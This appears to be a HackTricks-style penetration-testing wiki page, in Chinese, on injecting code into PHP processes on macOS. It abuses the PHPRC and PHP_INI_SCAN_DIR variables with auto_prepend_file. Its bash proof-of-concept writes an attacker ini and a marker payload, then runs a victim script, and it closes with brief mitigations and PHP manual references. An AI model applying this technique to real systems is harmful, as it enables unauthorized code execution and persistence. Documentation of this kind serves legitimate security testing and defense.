# macOS PHP Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## `PHPRC` / `PHP_INI_SCAN_DIR` 和 `auto_prepend_file`

PHP CLI 和 CGI 会在每次调用时读取配置。`PHPRC` 可以选择攻击者可读取的 `php.ini`，而 `PHP_INI_SCAN_DIR` 可以重定向用于扫描其他 `.ini` 文件的目录。`auto_prepend_file` 指令会使 PHP 在请求的脚本之前解析某个文件，因此这种组合会变成启动时的代码执行。<sup>[[1]](#references)[[2]](#references)</sup>
```bash
cat >/tmp/php-payload.php <<'PHP'
<?php file_put_contents('/tmp/php-prepend-executed', 'ok'); ?>
PHP
echo 'auto_prepend_file=/tmp/php-payload.php' >/tmp/attacker-php.ini

PHPRC=/tmp/attacker-php.ini php victim.php
```
另一种选择是包含一个 `.ini` 文件的目录：
```bash
mkdir -p /tmp/php-conf.d
echo 'auto_prepend_file=/tmp/php-payload.php' >/tmp/php-conf.d/99-prepend.ini
PHP_INI_SCAN_DIR=/tmp/php-conf.d php victim.php
```
`-n` 选项会忽略 `php.ini`；显式指定的可信 `-c` 路径优先于 `PHPRC`。请记住，长时间运行的 server SAPI 通常会在 web server 启动时读取配置，而 CLI 和 CGI 则会在每次调用时读取配置。<sup>[[1]](#references)</sup>

## References

- [1] [PHP 配置文件](https://www.php.net/manual/en/configuration.file.php)
- [2] [PHP `auto_prepend_file`](https://www.php.net/manual/en/ini.core.php#ini.auto-prepend-file)
{{#include ../../../banners/hacktricks-training.md}}
